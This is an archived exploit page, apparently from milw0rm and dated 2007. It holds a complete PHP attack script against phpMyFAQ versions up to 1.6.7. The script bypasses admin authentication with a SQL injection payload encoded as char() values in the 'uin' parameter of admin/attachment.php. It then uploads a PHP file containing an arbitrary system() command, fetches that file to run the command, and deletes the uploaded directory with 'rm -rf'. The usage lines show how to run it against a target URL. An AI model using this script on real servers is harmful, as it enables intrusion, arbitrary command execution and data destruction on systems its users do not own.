<html><head><title>phpMyFAQ <= 1.6.7 Remote SQL Injection / Command Execution Exploit</title></head><pre>#!/usr/bin/php5-cgi -q
&lt;?

/*
Sql injection / remote command execution exploit for phpmyfaq &lt; 1.6.8

Bugtraq:
http://www.securityfocus.com/bid/21944

CVS:
http://thinkforge.org/plugins/scmcvs/cvsweb.php/phpmyfaq/admin/attachment.php.diff?r1=1.7.2.11.2.5;r2=1.7.2.11.2.6;cvsroot=phpmyfaq;f=h

./pmf.php http://xxxx.xxxx.edu/faq/ &quot;&lt;? system('id'); ?&gt;&quot; localhost:4001

elgCrew@safe-mail.net
*/

function do_upload($baseurl, $proxy, $cmd)
{

	$fp = fopen(&quot;kebab.php&quot;, &quot;w&quot;);
	if(!$fp)
		die(&quot;Cannot open file for writing&quot;);

	$code = &quot;Un1q&quot; . $cmd . &quot;&lt;? system(\&quot;rm -rf ../1337/\&quot;); ?&gt;&quot;;
	fwrite($fp, $code);
	fclose($fp);
	
	$sendvars[&quot;aktion&quot;] = &quot;save&quot;;
        $sendvars[&quot;uin&quot;] = &quot;-1' UNION SELECT char(0x61,0x64,0x6d,0x69,0x6e),char(0x61,0x61,0x27,0x20,0x4f,0x52,0x20,0x31,0x3d,0x31,0x20,0x2f,0x2a) /*&quot;;
        $sendvars[&quot;save&quot;] = &quot;TRUE&quot;;
        $sendvars[&quot;MAX_FILE_SIZE&quot;] = &quot;100000&quot;;
        $sendvars[&quot;id&quot;] = &quot;1337&quot;;
        $sendvars[&quot;userfile&quot;] = '@kebab.php';
        $sendvars[&quot;filename&quot;] = &quot;kebab.php&quot;;

        $posturl = $baseurl . &quot;/admin/attachment.php&quot;;
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $posturl);

        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $sendvars);
        echo &quot;=&gt; Uploading file.\n&quot;;
        $result = curl_exec($ch);
	curl_close($ch);
	@unlink(&quot;kebab.php&quot;);
	$get =  $baseurl . &quot;/attachments/1337/kebab.php\n&quot;;

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $get);
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);
	if(strstr($result, &quot;Un1q&quot;))
		echo substr($result, 4);
	else
		echo &quot;Not vulnerable / error ?\n&quot;;
	curl_close($ch);


}

if($argc &lt; 3)
{
	printf(&quot;Usage: %s http://test.com/phpmyfaq/ \&quot;&lt;? system('uname -a'); ?&gt; \&quot; [proxy]\n&quot;, $argv[0]);
	exit(0);
}
if($argc == 4)
	$proxy = $argv[3];
else
	$proxy = &quot;&quot;;

do_upload($argv[1], $proxy, $argv[2]);

?&gt;

# milw0rm.com [2007-03-01]</pre></html>